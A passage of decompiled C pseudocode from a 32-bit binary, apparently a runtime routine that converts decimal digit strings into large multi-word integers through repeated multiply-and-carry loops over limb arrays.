uVar13 = (uVar10 * uVar3 >> 0x20) + CARRY4(uVar4, uVar13);\n                            puVar14 = puVar14 + 1;\n                        } while (puVar14 != var_1d4h);\n                        if (uVar13 != 0) {\n                            if (0x72 < var_1d4h) goto code_r0x004b81a0;\n                            (&var_1d0h)[var_1d4h] = uVar13;\n                            goto code_r0x004b8191;\n                        }\n                        goto code_r0x004b813c;\n                    }\n                }\n                else {\n                    var_918h = &var_910h;\n                    if (puVar11 <= var_914h) {\n                        var_918h = &var_1d0h;\n                    }\n                    var_93ch = &var_1d0h;\n                    puVar14 = puVar11;\n                    var_930h = var_914h;\n                    if (puVar11 <= var_914h) {\n                        var_93ch = &var_910h;\n                        puVar14 = var_914h;\n                        var_930h = puVar11;\n                    }\n                    var_1d4h = NULL;\n                    puVar11 = NULL;\n                    var_574h = NULL;\n                    if (var_930h != NULL) {\n                        do {\n                            if (var_918h[puVar11] == 0) {\n                                if (puVar11 == var_1d4h) {\n                                    (&var_570h)[puVar11] = 0;\n                                    var_1d4h = puVar11 + 1;\n                                    var_574h = var_1d4h;\n                                }\n                            }\n                            else {\n                                puVar8 = NULL;\n                                var_924h = NULL;\n                                puVar12 = puVar11;\n                                if (puVar14 != NULL) {\n                                    do {\n                                        puVar9 = var_924h;\n                                        if (puVar12 == 0x73) break;\n                                        if (puVar12 == var_1d4h) {\n                                            (&var_570h)[puVar12] = 0;\n                                            var_574h = puVar11 + 1 + puVar8;\n                                        }\n                                        uVar10 = var_93ch[puVar8];\n                                        uVar13 = var_918h[puVar11];\n                                        uVar4 = uVar10 * uVar13;\n                                        uVar3 = (&var_570h)[puVar12];\n                                        uVar5 = uVar4 + (&var_570h)[puVar12];\n                                        (&var_570h)[puVar12] = uVar5 + var_924h;\n                                        puVar9 = (uVar10 * uVar13 >> 0x20) + CARRY4(uVar4, uVar3) +\n                                                 CARRY4(uVar5, var_924h);\n                                        puVar8 = puVar8 + 1;\n                                        puVar12 = puVar12 + 1;\n                                        var_1d4h = var_574h;\n                                        var_924h = puVar9;\n                                    } while (puVar8 != puVar14);\n                                    do {\n                                        if (puVar9 == NULL) break;\n                                        if (puVar12 == 0x73) goto code_r0x004b8474;\n                                        if (puVar12 == var_1d4h) {\n                                            (&var_570h)[puVar12] = 0;\n                                            var_574h = puVar12 + 1;\n                                        }\n                                        ppuVar1 = &var_570h + puVar12;\n                                        puVar7 = *ppuVar1;\n                                        *ppuVar1 = *ppuVar1 + puVar9;\n                                        puVar9 = CARRY4(puVar7, puVar9);\n                                        puVar12 = puVar12 + 1;\n                                        var_1d4h = var_574h;\n                                    } while( true );\n                                }\n                                if (puVar12 == 0x73) {\ncode_r0x004b8474:\n                                    var_b2ch = NULL;\n                                    var_1d4h = NULL;\n                                    fcn.004bc06c(&var_1d0h, 0x1cc, &var_b28h, 0);\n                                    bVar16 = false;\n                                    goto code_r0x004b83f4;\n                                }\n                            }\n                            puVar11 = puVar11 + 1;\n                        } while (puVar11 != var_930h);\n                    }\n                    fcn.004bc06c(&var_1d0h, 0x1cc, &var_570h, var_1d4h << 2);\n                    bVar16 = true;\ncode_r0x004b83f4:\n                    var_918h = var_1d4h;\n                }\ncode_r0x004b8403:\n                if (!bVar16) goto code_r0x004b8438;\n                puVar11 = var_918h;\n            }\n            if (var_92ch != NULL) {\n                uVar10 = *(var_92ch * 4 + 0x55849c);\n                if (uVar10 == 0) {\ncode_r0x004b8438:\n                    var_b2ch = NULL;\n                    var_1d4h = NULL;\n                    fcn.004bc06c(&var_1d0h, 0x1cc, &var_b28h, 0);\ncode_r0x004b8463:\n                    var_918h = var_1d4h;\n                }\n                else if ((uVar10 != 1) && (puVar11 != NULL)) {\n                    uVar13 = 0;\n                    puVar14 = NULL;\n                    do {\n                        uVar3 = (&var_1d0h)[puVar14];\n                        uVar4 = uVar10 * uVar3;\n                        (&var_1d0h)[puVar14] = uVar4 + uVar13;\n                        uVar13 = (uVar10 * uVar3 >> 0x20) + CARRY4(uVar4, uVar13);\n                        puVar14 = puVar14 + 1;\n                    } while (puVar14 != puVar11);\n                    if (uVar13 == 0) goto code_r0x004b8463;\n                    if (0x72 < var_1d4h) goto code_r0x004b8438;\n                    (&var_1d0h)[var_1d4h] = uVar13;\n                    var_1d4h = var_1d4h + 1;\n                    var_918h = var_1d4h;\n                }\n            }\n            if (var_920h != NULL) {\n                puVar11 = NULL;\n                puVar14 = var_920h;\n                if (var_918h != NULL) {\n                    do {\n                        ppuVar1 = &var_1d0h + puVar11;\n                        puVar7 = *ppuVar1;\n                        *ppuVar1 = *ppuVar1 + puVar14;\n                        puVar14 = CARRY4(puVar7, puVar14);\n                        var_918h = var_1d4h;\n                        puVar11 = puVar11 + 1;\n                    } while (puVar11 != var_1d4h);\n                }\n                if (puVar14 != NULL) {\n                    if (var_918h < 0x73) {\n                        (&var_1d0h)[var_918h] = puVar14;\n                        var_1d4h = var_1d4h + 1;\n                        var_918h = var_1d4h;\n                    }\n                    else {\n                        var_b2ch = NULL;\n                        var_1d4h = NULL;\n                        fcn.004bc06c(&var_1d0h, 0x1cc, &var_b28h, 0);\n                        var_918h = var_1d4h;\n                    }\n                }\n            }\n        }\n    }\n    if (var_938h != NULL) {\n        var_92ch = var_938h % 10;\n        puVar14 = var_918h;\n        for (var_924h = var_938h / 10; var_918h = puVar14,  var_924h != NULL; var_924h = var_924h - var_920h) {\n            var_920h = var_924h;\n            if (0x26 < var_924h) {\n                var_920h = 0x26;\n            }\n            uVar10 = *(var_920h * 4 + 0x5583e6);\n            uVar13 = *(var_920h * 4 + 0x5583e7);\n            var_914h = uVar10 + uVar13;\n            fcn.00403189(&var_910h, 0, uVar10 * 4);\n            fcn.00405830(&var_910h + uVar10, *(var_920h * 4 + 0x5583e4) * 4 + 0x557910, uVar13 << 2);\n            uVar10 = var_1d0h;\n            if (var_914h < 0x2) {\n                if (var_910h == 0) {\ncode_r0x004b8663:\n                    var_1d4h = NULL;\n                    var_b2ch = NULL;\n                    fcn.004bc06c(&var_1d0h, 0x1cc, &var_b28h, 0);\n                }\n                else {\n                    if ((var_910h == 1) || (puVar14 == NULL)) {\n                        bVar16 = true;\n                        goto code_r0x004b893c;\n                    }\n                    uVar10 = 0;\n                    puVar11 = NULL;\n                    do {\n                        uVar13 = (&var_1d0h)[puVar11];\n                        uVar3 = var_910h * uVar13;\n                        (&var_1d0h)[puVar11] = uVar3 + uVar10;\n                        uVar10 = (var_910h * uVar13 >> 0x20) + CARRY4(uVar3, uVar10);\n                        puVar11 = puVar11 + 1;\n                    } while (puVar11 != puVar14);\n                    if (uVar10 != 0) {\n                        if (0x72 < var_1d4h) {\ncode_r0x004b86dc:\n                            var_b2ch = NULL;\n                            var_1d4h = NULL;\n                            fcn.004bc06c(&var_1d0h, 0x1cc, &var_b28h, 0);\n                            bVar16 = false;\n                            var_918h = var_1d4h;\n                            goto code_r0x004b893c;\n                        }\n                        (&var_1d0h)[var_1d4h] = uVar10;\ncode_r0x004b86cd:\n                        var_1d4h = var_1d4h + 1;\n                    }\n                }\ncode_r0x004b8678:\n                bVar16 = true;\n                var_918h = var_1d4h;\n            }\n            else if (puVar14 < 0x2) {\n                var_1d4h = var_914h;\n                fcn.004bc06c(&var_1d0h, 0x1cc, &var_910h, var_914h << 2);\n                if (uVar10 == 0) goto code_r0x004b8663;\n                bVar16 = true;\n                var_918h = var_1d4h;\n                if ((uVar10 != 1) && (var_1d4h != NULL)) {\n                    uVar13 = 0;\n                    puVar14 = NULL;\n                    do {\n                        uVar3 = (&var_1d0h)[puVar14];\n                        uVar4 = uVar10 * uVar3;\n                        (&var_1d0h)[puVar14] = uVar4 + uVar13;\n                        uVar13 = (uVar10 * uVar3 >> 0x20) + CARRY4(uVar4, uVar13);\n                        puVar14 = puVar14 + 1;\n                    } while (puVar14 != var_1d4h);\n                    if (uVar13 != 0) {\n                        if (0x72 < var_1d4h) goto code_r0x004b86dc;\n                        (&var_1d0h)[var_1d4h] = uVar13;\n                        goto code_r0x004b86cd;\n                    }\n                    goto code_r0x004b8678;\n                }\n            }\n            else {\n                var_928h = &var_910h;\n                if (puVar14 <= var_914h) {\n                    var_928h = &var_1d0h;\n                }\n                var_934h = &var_1d0h;\n                puVar11 = puVar14;\n                var_93ch = var_914h;\n                if (puVar14 <= var_914h) {\n                    var_934h = &var_910h;\n                    puVar11 = var_914h;\n                    var_93ch = puVar14;\n                }\n                var_1d4h = NULL;\n                puVar14 = NULL;\n                var_574h = NULL;\n                if (var_93ch != NULL) {\n                    do {\n                        if (var_928h[puVar14] == 0) {\n                            if (puVar14 == var_1d4h) {\n                                (&var_570h)[puVar14] = 0;\n                                var_1d4h = puVar14 + 1;\n                                var_574h = var_1d4h;\n                            }\n                        }\n                        else {\n                            uVar10 = 0;\n                            var_930h = NULL;\n                            puVar12 = puVar14;\n                            if (puVar11 != NULL) {\n                                do {\n                                    if (puVar12 == 0x73) break;\n                                    if (puVar12 == var_1d4h) {\n                                        (&var_570h)[puVar12] = 0;\n                                        var_574h = puVar14 + 1 + var_930h;\n                                    }\n                                    uVar13 = var_934h[var_930h];\n                                    uVar3 = var_928h[puVar14];\n                                    uVar5 = uVar13 * uVar3;\n                                    uVar6 = uVar5 + uVar10;\n                                    puVar8 = &var_570h + puVar12;\n                                    uVar4 = *puVar8;\n                                    *puVar8 = *puVar8 + uVar6;\n                                    uVar10 = (uVar13 * uVar3 >> 0x20) + CARRY4(uVar5, uVar10) + CARRY4(uVar4, uVar6);\n                                    var_930h = var_930h + 1;\n                                    puVar12 = puVar12 + 1;\n                                    var_1d4h = var_574h;\n                                } while (var_930h != puVar11);\n                                do {\n                                    if (uVar10 == 0) break;\n                                    if (puVar12 == 0x73) goto code_r0x004b89ba;\n                                    if (puVar12 == var_1d4h) {\n                                        (&var_570h)[puVar12] = 0;\n                                        var_574h = puVar12 + 1;\n                                    }\n                                    puVar8 = &var_570h + puVar12;\n                                    uVar13 = *puVar8;\n                                    *puVar8 = *puVar8 + uVar10;\n                                    uVar10 = CARRY4(uVar13, uVar10);\n                                    puVar12 = puVar12 + 1;\n                                    var_1d4h = var_574h;\n                                } while( true );\n                            }\n                            if (puVar12 == 0x73) {\ncode_r0x004b89ba:\n                                var_b2ch = NULL;\n                                var_1d4h = NULL;\n                                fcn.004bc06c(&var_1d0h, 0x1cc, &var_b28h, 0);\n                                bVar16 = false;\n                                goto code_r0x004b8930;\n                            }\n                        }\n                        puVar14 = puVar14 + 1;\n                    } while (puVar14 != var_93ch);\n                }\n                fcn.004bc06c(&var_1d0h, 0x1cc, &var_570h, var_1d4h << 2);\n                bVar16 = true;\ncode_r0x004b8930:\n                var_918h = var_1d4h;\n            }\ncode_r0x004b893c:\n            if (!bVar16) goto code_r0x004b8a61;\n            puVar14 = var_918h;\n        }\n        if (var_92ch == NULL) goto code_r0x004b89ab;\n        uVar10 = *(var_92ch * 4 + 0x55849c);\n        if (uVar10 == 0) {\n            var_b2ch = NULL;\n            var_1d4h = NULL;\n            fcn.004bc06c(&var_1d0h, 0x1cc, &var_b28h, 0);\n            var_918h = var_1d4h;\n            goto code_r0x004b89ab;\n        }\n        if (uVar10 == 1) goto code_r0x004b89ab;\n        if (puVar14 == NULL) goto code_r0x004b89b3;\n        uVar13 = 0;\n        puVar11 = NULL;\n        do {\n            uVar3 = (&var_1d0h)[puVar11];\n            uVar4 = uVar10 * uVar3;\n            (&var_1d0h)[puVar11] = uVar4 + uVar13;\n            uVar13 = (uVar10 * uVar3 >> 0x20) + CARRY4(uVar4, uVar13);\n            puVar11 = puVar11 + 1;\n        } while (puVar11 != puVar14);\n        var_918h = var_1d4h;\n        if (uVar13 == 0) goto code_r0x004b89ab;\n        var_918h = puVar14;\n        if (var_1d4h < 0x73) {\n            (&var_1d0h)[var_1d4h] = uVar13;\n            var_1d4h = var_1d4h + 1;\n            var_918h = var_1d4h;\n            goto code_r0x004b89ab;\n        }\ncode_r0x004b8a61:\n        var_1d4h = NULL;\n        fcn.004bc06c(&var_1d0h, 0x1cc, &var_b28h, 0);\n        fcn.004050e2(*(var_948h + 0xc2), var_950h);\ncode_r0x004b8a99:\n        var_b2ch = NULL;\n        goto code_r0x004b9b4d;\n    }\ncode_r0x004b89ab:\n    if (var_918h == NULL) {\ncode_r0x004b89b3:\n        var_93ch = NULL;\n    }\n    else {\n        uVar10 = (&var_1d4h)[var_918h];\n        var_944h = 0;\n        iVar19 = 0x1f;\n        if (uVar10 != 0) {\n            for (; uVar10 >> iVar19 == 0; iVar19 = iVar19 + -1) {\n            }\n        }\n        if (uVar10 == 0) {\n            iVar19 = 0;\n        }\n        else {\n            iVar19 = iVar19 + 1;\n        }\n        var_93ch = (var_918h + -1) * 0x20 + iVar19;\n    }\n    if ((var_94ch <= var_93ch) || (var_91ch == NULL)) {\n        bVar16 = var_958h != var_954h;\n        uVar2 = *(var_948h + 0xc2);\ncode_r0x004b9b3e:\n        fcn.00401f1e(&var_1d4h, var_93ch, uVar2, bVar16, var_950h);\n        goto code_r0x004b9b4d;\n    }\n    puVar14 = NULL;\n    var_3a4h = NULL;\n    uVar10 = 0;\n    var_924h = NULL;\n    var_920h = var_954h;\n    puVar11 = var_954h;\n    if (var_954h != var_958h) {\n        do {\n            puVar12 = var_924h;\n            if (uVar10 == 9) {\n                var_920h = puVar11;\n                if (puVar14 != NULL) {\n                    uVar10 = 0;\n                    puVar11 = NULL;\n                    do {\n                        uVar13 = (&var_3a0h)[puVar11];\n                        uVar3 = uVar13 * 1000000000;\n                        (&var_3a0h)[puVar11] = uVar3 + uVar10;\n                        uVar10 = (uVar13 * 1000000000 >> 0x20) + CARRY4(uVar3, uVar10);\n                        puVar11 = puVar11 + 1;\n                    } while (puVar11 != puVar14);\n                    puVar14 = var_3a4h;\n                    if (uVar10 != 0) {\n                        if (var_3a4h < 0x73) {\n                            (&var_3a0h)[var_3a4h] = uVar10;\n                            var_3a4h = var_3a4h + 1;\n                            puVar14 = var_3a4h;\n                        }\n                        else {\n                            var_b2ch = NULL;\n                            var_3a4h = NULL;\n                            fcn.004bc06c(&var_3a0h, 0x1cc, &var_b28h, 0);\n                            puVar14 = var_3a4h;\n                        }\n                    }\n                }\n                puVar11 = var_920h;\n                if (puVar12 != NULL) {\n                    puVar8 = NULL;\n                    if (puVar14 != NULL) {\n                        do {\n                            ppuVar1 = &var_3a0h + puVar8;\n                            puVar7 = *ppuVar1;\n                            *ppuVar1 = *ppuVar1 + puVar12;\n                            puVar12 = CARRY4(puVar7, puVar12);\n                            puVar8 = puVar8 + 1;\n                            puVar14 = var_3a4h;\n                        } while (puVar8 != var_3a4h);\n                    }\n                    if (puVar12 != NULL) {\n                        if (puVar14 < 0x73) {\n                            (&var_3a0h)[puVar14] = puVar12;\n                            var_3a4h = var_3a4h + 1;\n                            puVar14 = var_3a4h;\n                        }\n                        else {\n                            var_b2ch = NULL;\n                            var_3a4h = NULL;\n                            fcn.004bc06c(&var_3a0h, 0x1cc, &var_b28h, 0);\n                            puVar14 = var_3a4h;\n                        }\n                    }\n                }\n                var_924h = NULL;\n                uVar10 = 0;\n            }\n            var_924h = var_924h * 10 + *puVar11;\n            uVar10 = uVar10 + 1;\n            puVar11 = puVar11 + 1;\n        } while (puVar11 != var_958h);\n        var_920h = puVar11;\n        if (uVar10 != 0) {\n            var_940h = uVar10 % 10;\n            for (var_92ch = uVar10 / 10; var_92ch != NULL; var_92ch = var_92ch - var_920h) {\n                var_920h = var_92ch;\n                if (0x26 < var_92ch) {\n                    var_920h = 0x26;\n                }\n                uVar10 = *(var_920h * 4 + 0x5583e6);\n                uVar13 = *(var_920h * 4 + 0x5583e7);\n                var_914h = uVar10 + uVar13;\n                fcn.00403189(&var_910h, 0, uVar10 * 4);\n                fcn.00405830(&var_910h + uVar10, *(var_920h * 4 + 0x5583e4) * 4 + 0x557910, uVar13 << 2);\n                uVar10 = var_3a0h;\n                if (var_914h < 0x2) {\n                    if (var_910h == 0) {\n                        var_b2ch = NULL;\n                        var_3a4h = NULL;\n                        iVar19 = 0;\n                        puVar15 = &var_b28h;\n                        goto code_r0x004b8f75;\n                    }\n                    if ((var_910h == 1) || (puVar14 == NULL)) {\n                        bVar16 = true;\n                    }\n                    else {\n                        uVar13 = 0;\n                        puVar11 = NULL;\n                        do {\n                            uVar10 = (&var_3a0h)[puVar11];\n                            uVar3 = var_910h * uVar10;\n                            (&var_3a0h)[puVar11] = uVar3 + uVar13;\n                            uVar13 = (var_910h * uVar10 >> 0x20) + CARRY4(uVar3, uVar13);\n                            puVar11 = puVar11 + 1;\n                        } while (puVar11 != puVar14);\ncode_r0x004b8d2d:\n                        if (uVar13 != 0) {\n                            if (0x72 < var_3a4h) {\n                                var_b2ch = NULL;\n                                var_3a4h = NULL;\n                                fcn.004bc06c(&var_3a0h, 0x1cc, &var_b28h, 0);\n                                bVar16 = false;\n                                puVar14 = var_3a4h;\n                                goto code_r0x004b8f8c;\n                            }\n                            (&var_3a0h)[var_3a4h] = uVar13;\n                            var_3a4h = var_3a4h + 1;\n                        }\n                        bVar16 = true;\n                        puVar14 = var_3a4h;\n                    }\n                }\n                else {\n                    if (puVar14 < 0x2) {\n                        var_3a4h = var_914h;\n                        fcn.004bc06c(&var_3a0h, 0x1cc, &var_910h, var_914h << 2);\n                        if (uVar10 != 0) {\n                            bVar16 = true;\n                            puVar14 = var_3a4h;\n                            if ((uVar10 != 1) && (var_3a4h != NULL)) {\n                                uVar13 = 0;\n                                puVar14 = NULL;\n                                do {\n                                    uVar3 = (&var_3a0h)[puVar14];\n                                    uVar4 = uVar10 * uVar3;\n                                    (&var_3a0h)[puVar14] = uVar4 + uVar13;\n                                    uVar13 = (uVar10 * uVar3 >> 0x20) + CARRY4(uVar4, uVar13);\n                                    puVar14 = puVar14 + 1;\n                                } while (puVar14 != var_3a4h);\n                                goto code_r0x004b8d2d;\n                            }\n                            goto code_r0x004b8f8c;\n                        }\n                        iVar19 = 0;\n                        var_b2ch = NULL;\n                        var_3a4h = NULL;\n                        puVar15 = &var_b28h;\n                    }\n                    else {\n                        var_928h = &var_910h;\n                        if (puVar14 <= var_914h) {\n                            var_928h = &var_3a0h;\n                        }\n                        var_934h = &var_3a0h;\n                        puVar11 = puVar14;\n                        var_938h = var_914h;\n                        if (puVar14 <= var_914h) {\n                            var_934h = &var_910h;\n                            puVar11 = var_914h;\n                            var_938h = puVar14;\n                        }\n                        var_3a4h = NULL;\n                        puVar14 = NULL;\n                        var_574h = NULL;\n                        if (var_938h != NULL) {\n                            do {\n                                if (var_928h[puVar14] == 0) {\n                                    if (puVar14 == var_3a4h) {\n                                        (&var_570h)[puVar14] = 0;\n                                        var_3a4h = puVar14 + 1;\n                                        var_574h = var_3a4h;\n                                    }\n                                }\n                                else {\n                                    uVar10 = 0;\n                                    var_930h = NULL;\n                                    puVar12 = puVar14;\n                                    if (puVar11 != NULL) {\n                                        do {\n                                            if (puVar12 == 0x73) break;\n                                            if (puVar12 == var_3a4h) {\n                                                (&var_570h)[puVar12] = 0;\n                                                var_574h = puVar14 + 1 + var_930h;\n                                            }\n                                            uVar13 = var_934h[var_930h];\n                                            uVar3 = var_928h[puVar14];\n                                            uVar5 = uVar13 * uVar3;\n                                            uVar6 = uVar5 + uVar10;\n                                            puVar8 = &var_570h + puVar12;\n                                            uVar4 = *puVar8;\n                                            *puVar8 = *puVar8 + uVar6;\n                                            uVar10 = (uVar13 * uVar3 >> 0x20) + CARRY4(uVar5, uVar10) +\n                                                     CARRY4(uVar4, uVar6);\n                                            var_930h = var_930h + 1;\n                                            puVar12 = puVar12 + 1;\n                                            var_3a4h = var_574h;\n                                        } while (var_930h != puVar11);\n                                        do {\n                                            if (uVar10 == 0) break;\n                                            if (puVar12 == 0x73) goto code_r0x004b9023;\n                                            if (puVar12 == var_3a4h) {\n                                                (&var_570h)[puVar12] = 0;\n                                                var_574h = puVar12 + 1;\n                                            }\n                                            puVar8 = &var_570h + puVar12;\n                                            uVar13 = *puVar8;\n                                            *puVar8 = *puVar8 + uVar10;\n                                            uVar10 = CARRY4(uVar13, uVar10);\n                                            puVar12 = puVar12 + 1;\n                                            var_3a4h = var_574h;\n                                        } while( true );\n                                    }\n                                    if (puVar12 == 0x73) {\ncode_r0x004b9023:\n                                        var_b2ch = NULL;\n                                        var_3a4h = NULL;\n                                        fcn.004bc06c(&var_3a0h, 0x1cc, &var_b28h, 0);\n                                        bVar16 = false;\n                                        puVar14 = var_3a4h;\n                                        goto code_r0x004b8f8c;\n                                    }\n                                }\n                                puVar14 = puVar14 + 1;\n                            } while (puVar14 != var_938h);\n                        }\n                        iVar19 = var_3a4h << 2;\n                        puVar15 = &var_570h;\n                    }\ncode_r0x004b8f75:\n                    fcn.004bc06c(&var_3a0h, 0x1cc, puVar15, iVar19);\n                    bVar16 = true;\n                    puVar14 = var_3a4h;\n                }\ncode_r0x004b8f8c:\n                if (!bVar16) goto code_r0x004b9075;\n            }\n            if (var_940h != NULL) {\n                uVar10 = *(var_940h * 4 + 0x55849c);\n                if (uVar10 == 0) {\ncode_r0x004b9075:\n                    var_3a4h = NULL;\n                    var_b2ch = NULL;\n                    fcn.004bc06c(&var_3a0h, 0x1cc, &var_b28h, 0);\n                    puVar14 = var_3a4h;\n                }\n                else if ((uVar10 != 1) && (puVar14 != NULL)) {\n                    uVar13 = 0;\n                    puVar11 = NULL;\n                    do {\n                        uVar3 = (&var_3a0h)[puVar11];\n                        uVar4 = uVar10 * uVar3;\n                        (&var_3a0h)[puVar11] = uVar4 + uVar13;\n                        uVar13 = (uVar10 * uVar3 >> 0x20) + CARRY4(uVar4, uVar13);\n                        puVar11 = puVar11 + 1;\n                    } while (puVar11 != puVar14);\n                    puVar14 = var_3a4h;\n                    if (uVar13 != 0) {\n                        if (0x72 < var_3a4h) goto code_r0x004b9075;\n                        (&var_3a0h)[var_3a4h] = uVar13;\n                        var_3a4h = var_3a4h + 1;\n                        puVar14 = var_3a4h;\n                    }\n                }\n            }\n            if (var_924h != NULL) {\n                puVar12 = NULL;\n                puVar11 = var_924h;\n                if (puVar14 != NULL) {\n                    do {\n                        ppuVar1 = &var_3a0h + puVar12;\n                        puVar7 = *ppuVar1;\n                        *ppuVar1 = *ppuVar1 + puVar11;\n                        puVar11 = CARRY4(puVar7, puVar11);\n                        puVar12 = puVar12 + 1;\n                        puVar14 = var_3a4h;\n                    } while (puVar12 != var_3a4h);\n                }\n                if (puVar11 != NULL) {\n                    if (puVar14 < 0x73) {\n                        (&var_3a0h)[puVar14] = puVar11;\n                        var_3a4h = var_3a4h + 1;\n                        puVar14 = var_3a4h;\n                    }\n                    else {\n                        var_b2ch = NULL;\n                        var_3a4h = NULL;\n                        fcn.004bc06c(&var_3a0h, 0x1cc, &var_b28h, 0);\n                        puVar14 = var_3a4h;\n                    }\n                }\n            }\n        }\n    }\n    var_928h = var_91ch;\n    if (*var_948h < 0) {\n        var_928h = var_91ch - *var_948h;\n    }\n    var_73ch = 0;\n    var_940h = var_928h % 10;\n    var_740h = 1;\n    var_91ch = 0x1;\n    var_744h = 0x1;\n    for (var_928h = var_928h / 10; var_928h != NULL; var_928h = var_928h - var_930h) {\n        var_930h = var_928h;\n        if (0x26 < var_928h) {\n            var_930h = 0x26;\n        }\n        puVar14 = var_930h;\n        uVar10 = *(var_930h * 4 + 0x5583e6);\n        uVar13 = *(var_930h * 4 + 0x5583e7);\n        var_914h = uVar10 + uVar13;\n        fcn.00403189(&var_910h, 0, uVar10 * 4);\n        fcn.00405830(&var_910h + uVar10, *(puVar14 * 4 + 0x5583e4) * 4 + 0x557910, uVar13 << 2);\n        uVar10 = var_740h;\n        if (var_914h < 0x2) {\n            if (var_910h == 0) {\ncode_r0x004b91fa:\n                var_744h = NULL;\n                var_b2ch = NULL;\n                fcn.004bc06c(&var_740h, 0x1cc, &var_b28h, 0);\n            }\n            else {\n                if ((var_910h == 1) || (var_91ch == NULL)) {\n                    bVar16 = true;\n                    goto code_r0x004b94c9;\n                }\n                uVar13 = 0;\n                puVar14 = NULL;\n                do {\n                    uVar10 = (&var_740h)[puVar14];\n                    uVar3 = var_910h * uVar10;\n                    (&var_740h)[puVar14] = uVar3 + uVar13;\n                    uVar13 = (var_910h * uVar10 >> 0x20) + CARRY4(uVar3, uVar13);\n                    puVar14 = puVar14 + 1;\n                } while (puVar14 != var_91ch);\ncode_r0x004b9306:\n                if (uVar13 != 0) {\n                    if (0x72 < var_744h) {\n                        var_b2ch = NULL;\n                        var_744h = NULL;\n                        fcn.004bc06c(&var_740h, 0x1cc, &var_b28h, 0);\n                        bVar16 = false;\n                        var_91ch = var_744h;\n                        goto code_r0x004b94c9;\n                    }\n                    (&var_740h)[var_744h] = uVar13;\n                    var_744h = var_744h + 1;\n                }\n            }\n            bVar16 = true;\n            var_91ch = var_744h;\n        }\n        else if (var_91ch < 0x2) {\n            var_744h = var_914h;\n            fcn.004bc06c(&var_740h, 0x1cc, &var_910h, var_914h << 2);\n            if (uVar10 == 0) goto code_r0x004b91fa;\n            bVar16 = true;\n            var_91ch = var_744h;\n            if ((uVar10 != 1) && (var_744h != NULL)) {\n                uVar13 = 0;\n                puVar14 = NULL;\n                do {\n                    uVar3 = (&var_740h)[puVar14];\n                    uVar4 = uVar10 * uVar3;\n                    (&var_740h)[puVar14] = uVar4 + uVar13;\n                    uVar13 = (uVar10 * uVar3 >> 0x20) + CARRY4(uVar4, uVar13);\n                    puVar14 = puVar14 + 1;\n                } while (puVar14 != var_744h);\n                goto code_r0x004b9306;\n            }\n        }\n        else {\n            var_924h = &var_910h;\n            if (var_91ch <= var_914h) {\n                var_924h = &var_740h;\n            }\n            var_92ch = &var_740h;\n            puVar14 = var_91ch;\n            var_934h = var_914h;\n            if (var_91ch <= var_914h) {\n                var_92ch = &var_910h;\n                puVar14 = var_914h;\n                var_934h = var_91ch;\n            }\n            var_744h = NULL;\n            puVar11 = NULL;\n            var_574h = NULL;\n            if (var_934h != NULL) {\n                do {\n                    if (var_924h[puVar11] == 0) {\n                        if (puVar11 == var_744h) {\n                            (&var_570h)[puVar11] = 0;\n                            var_744h = puVar11 + 1;\n                            var_574h = var_744h;\n                        }\n                    }\n                    else {\n                        uVar10 = 0;\n                        var_938h = NULL;\n                        puVar12 = puVar11;\n                        if (puVar14 != NULL) {\n                            do {\n                                if (puVar12 == 0x73) break;\n                                if (puVar12 == var_744h) {\n                                    (&var_570h)[puVar12] = 0;\n                                    var_574h = puVar11 + 1 + var_938h;\n                                }\n                                uVar13 = var_92ch[var_938h];\n                                uVar3 = var_924h[puVar11];\n                                uVar5 = uVar13 * uVar3;\n                                uVar6 = uVar5 + uVar10;\n                                puVar8 = &var_570h + puVar12;\n                                uVar4 = *puVar8;\n                                *puVar8 = *puVar8 + uVar6;\n                                uVar10 = (uVar13 * uVar3 >> 0x20) + CARRY4(uVar5, uVar10) + CARRY4(uVar4, uVar6);\n                                var_938h = var_938h + 1;\n                                puVar12 = puVar12 + 1;\n                                var_744h = var_574h;\n                            } while (var_938h != puVar14);\n                            do {\n                                if (uVar10 == 0) break;\n                                if (puVar12 == 0x73) goto code_r0x004b9551;\n                                if (puVar12 == var_744h) {\n                                    (&var_570h)[puVar12] = 0;\n                                    var_574h = puVar12 + 1;\n                                }\n                                puVar8 = &var_570h + puVar12;\n                                uVar13 = *puVar8;\n                                *puVar8 = *puVar8 + uVar10;\n                                uVar10 = CARRY4(uVar13, uVar10);\n                                puVar12 = puVar12 + 1;\n                                var_744h = var_574h;\n                            } while( true );\n                        }\n                        if (puVar12 == 0x73) {\ncode_r0x004b9551:\n                            var_b2ch = NULL;\n                            var_744h = NULL;\n                            fcn.004bc06c(&var_740h, 0x1cc, &var_b28h, 0);\n                            bVar16 = false;\n                            goto code_r0x004b94bd;\n                        }\n                    }\n                    puVar11 = puVar11 + 1;\n                } while (puVar11 != var_934h);\n            }\n            fcn.004bc06c(&var_740h, 0x1cc, &var_570h, var_744h << 2);\n            bVar16 = true;\ncode_r0x004b94bd:\n            var_91ch = var_744h;\n        }\ncode_r0x004b94c9:\n        if (!bVar16) goto code_r0x004b9608;\n        puVar14 = var_3a4h;\n    }\n    if (var_940h != NULL) {\n        puVar11 = *(var_940h * 4 + 0x55849c);\n        var_940h = puVar11;\n        if (puVar11 == NULL) {\n            var_744h = puVar11;\n            fcn.004bc06c(&var_740h, 0x1cc, &var_b28h, 0);\n            puVar14 = var_3a4h;\n            var_b2ch = puVar11;\ncode_r0x004b9540:\n            var_91ch = var_744h;\n        }\n        else if ((puVar11 != 0x1) && (var_91ch != NULL)) {\n            uVar10 = 0;\n            puVar12 = NULL;\n            do {\n                uVar13 = (&var_740h)[puVar12];\n                uVar3 = ZEXT48(puVar11) * uVar13;\n                (&var_740h)[puVar12] = uVar3 + uVar10;\n                uVar10 = (ZEXT48(puVar11) * uVar13 >> 0x20) + CARRY4(uVar3, uVar10);\n                puVar12 = puVar12 + 1;\n            } while (puVar12 != var_91ch);\n            if (uVar10 == 0) goto code_r0x004b9540;\n            if (0x72 < var_744h) {\ncode_r0x004b9608:\n                var_744h = NULL;\n                fcn.004bc06c(&var_740h, 0x1cc, &var_b28h, 0);\n                fcn.004062ee(*(var_948h + 0xc2), var_950h);\n                goto code_r0x004b8a99;\n            }\n            (&var_740h)[var_744h] = uVar10;\n            var_91ch = var_744h + 1;\n            var_744h = var_91ch;\n        }\n    }\n    if (puVar14 == NULL) {\n        uVar10 = 0;\n    }\n    else {\n        uVar10 = (&var_3a4h)[puVar14];\n        var_944h = 0;\n        iVar19 = 0x1f;\n        if (uVar10 != 0) {\n            for (; uVar10 >> iVar19 == 0; iVar19 = iVar19 + -1) {\n            }\n        }\n        if (uVar10 == 0) {\n            iVar19 = 0;\n        }\n        else {\n            iVar19 = 